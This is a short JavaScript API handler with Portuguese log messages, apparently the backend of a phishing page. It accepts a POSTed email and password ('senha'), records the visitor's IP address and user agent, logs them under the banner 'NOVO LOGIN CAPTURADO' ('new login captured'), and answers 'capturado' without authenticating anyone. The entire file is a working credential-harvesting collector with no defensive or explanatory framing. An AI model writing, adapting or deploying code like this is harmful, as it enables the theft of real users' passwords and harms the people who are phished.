export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const { email, senha } = req.body;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'];

    console.log('[+] NOVO LOGIN CAPTURADO');
    console.log(`Email: ${email}`);
    console.log(`Senha: ${senha}`);
    console.log(`IP: ${ip}`);
    console.log(`User-Agent: ${ua}`);

    return res.status(200).json({ message: 'capturado' });
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ message: 'erro interno' });
  }
}
